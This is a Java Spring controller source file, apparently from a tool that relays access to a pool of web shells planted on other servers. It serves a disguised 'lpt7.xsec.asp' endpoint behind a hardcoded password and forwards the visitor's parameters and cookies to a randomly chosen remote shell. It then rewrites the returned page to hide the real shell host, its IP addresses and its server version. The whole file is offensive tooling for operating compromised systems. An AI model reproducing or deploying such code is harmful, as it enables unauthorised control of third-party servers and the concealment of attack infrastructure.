package com.ezone.web.controller;

import java.io.PrintWriter;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URLEncoder;
import java.util.Collections;
import java.util.Enumeration;
import java.util.List;
import java.util.Map;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.coody.framework.context.entity.HttpEntity;
import org.coody.framework.core.controller.BaseController;
import org.coody.framework.util.RequestUtil;
import org.coody.framework.util.SpringContextHelper;
import org.coody.framework.util.StringUtil;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

import com.ezone.web.domain.ShellInfo;
import com.ezone.web.service.ShellService;

@Controller
@RequestMapping("/")
@SuppressWarnings("rawtypes")
public class ShellController extends BaseController {

	@RequestMapping(value = { "lpt7.xsec.asp" })
	public void shell(HttpServletRequest req, HttpServletResponse response) {
		response.setContentType("text/html");
		try {
			request.setCharacterEncoding("GBK");
			response.setCharacterEncoding("GBK");
			PrintWriter out = response.getWriter();
			loadCurrIp(request);
			String action = request.getParameter("action");
			if ("login".equals(action)) {
				if (!checkLogin(request)) {
					out.print("{'code':1}");
					return;
				}
				out.print("{'code':0}");
				return;
			}
			if (!checkLogin(request)) {
				request.getRequestDispatcher("/WEB-INF/view/shell.jsp").forward(request, response);
				return;
			}
			String html = doShell(request, response);
			out.write(html);
		} catch (Exception e) {

		}
	}

	private void addCookie(HttpServletResponse response, Map<String, String> cookieMap) {
		if (StringUtil.isNullOrEmpty(cookieMap)) {
			return;
		}
		for (String str : cookieMap.keySet()) {
			if (str.equalsIgnoreCase("JSESSIONID") || str.equalsIgnoreCase("ESPSESSION")) {
				continue;
			}
			response.addCookie(new Cookie(str, cookieMap.get(str)));
		}
	}

	private boolean checkLogin(HttpServletRequest request) {
		Integer isLogin = (Integer) request.getSession().getAttribute("webShellIsLogin");
		if (isLogin != null) {
			return true;
		}
		String password = request.getParameter("pass");
		if (password != null) {
			password = password.trim();
		}
		if ("coody".equals(password)) {
			request.getSession().setAttribute("webShellIsLogin", 1);
			return true;
		}
		return false;
	}

	private void loadCurrIp(HttpServletRequest request) {
		ShellService shellCache = (ShellService) SpringContextHelper.getBean(ShellService.class);
		String ip = shellCache.getShellIp(String.valueOf(request.getAttribute("basePath")));
		request.setAttribute("currIp", ip);
	}

	public String doShell(HttpServletRequest request, HttpServletResponse response) {
		ShellInfo shell = getAShell(request);
		if (StringUtil.isNullOrEmpty(shell)) {
			return null;
		}
		String postData = getPostData(request);
		String html = getShellHtml(request, response, shell, postData);

		return html;
	}

	private String getShellHtml(HttpServletRequest request, HttpServletResponse response, ShellInfo shell,
			String postData) {
		ShellService shellCache = (ShellService) SpringContextHelper.getBean(ShellService.class);
		String cookie = RequestUtil.getRequestCookies(request);
		HttpEntity entity = shellCache.getShellHtml(shell.getUrl(), postData, cookie);
		if (StringUtil.isNullOrEmpty(entity)) {
			shell.setErrNum(shell.getErrNum() + 1);
			if (shell.getErrNum() > 30) {
				return "<h1 align='center'>访问超时，请刷新后继续浏览！</h1>";
			}
			return "<h1 align='center'>访问超时，请刷新后继续浏览！</h1>";
		}
		String html = entity.getHtml();
		if (StringUtil.isNullOrEmpty(html)) {
			return "<h1 align='center'>访问超时，请刷新后继续浏览！</h1>";
		}
		addCookie(response, entity.getCookieMap());
		String ip = shellCache.getShellIp(String.valueOf(request.getAttribute("basePath")));
		if (ip != null) {
			html = html.replaceAll("\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}", ip);
			html = html.replaceAll("IIS/[0-9].[0-9]", "IIS/9.0");
		}
		String path = getRequestPath(request);
		String shellPath = getUrlPath(shell.getUrl());
		String host = getUrlHost(shell.getUrl());
		html = html.replace(shellPath, path).replace(host, path);
		String tmptxt = "<img src=\"" + StringUtil.textCutCenter(html, "PR:<img src=\"", "\"") + "\">";
		html = html.replace(tmptxt, "");
		return html;
	}

	public String getUrlHost(String url) {
		try {
			URI uri = new URI(url);
			return uri.getHost();
		} catch (URISyntaxException e) {
			e.printStackTrace();
		}
		return null;
	}

	public String getUrlPath(String url) {
		try {
			URI uri = new URI(url);
			return uri.getPath();
		} catch (URISyntaxException e) {
			e.printStackTrace();
		}
		return null;
	}

	public String getPostData(HttpServletRequest request) {
		Enumeration e = (Enumeration) request.getParameterNames();
		if (StringUtil.isNullOrEmpty(e)) {
			return "";
		}
		StringBuffer sbData = new StringBuffer("");
		while (e.hasMoreElements()) {
			try {
				String parName = (String) e.nextElement();
				String value = request.getParameter(parName);
				if (StringUtil.isNullOrEmpty(value)) {
					continue;
				}
				value = URLEncoder.encode(value, "GBK");
				sbData.append(parName);
				sbData.append("=");
				sbData.append(value);
				sbData.append("&");
			} catch (Exception e2) {
			}
		}
		return sbData.toString();
	}

	public String getRequestPath(HttpServletRequest request) {
		String path = request.getRequestURI();
		path = path.replace(request.getContextPath(), "");
		path = path.replace("/", "");
		String localPath = request.getScheme() + "://" + request.getServerName() + ":" + request.getServerPort()
				+ request.getContextPath() + "/" + path;
		return localPath;
	}

	public ShellInfo getAShell(HttpServletRequest request) {
		// 获得一个
		ShellInfo shell = (ShellInfo) request.getSession().getAttribute("currShell");
		if (!StringUtil.isNullOrEmpty(shell)) {
			return shell;
		}
		ShellService shellCache = (ShellService) SpringContextHelper.getBean(ShellService.class);
		List<ShellInfo> shells = shellCache.loadShells();
		if (StringUtil.isNullOrEmpty(shells)) {
			return null;
		}
		Collections.shuffle(shells);
		shell = shells.get(0);
		request.getSession().setAttribute("currShell", shell);
		return shell;
	}
}
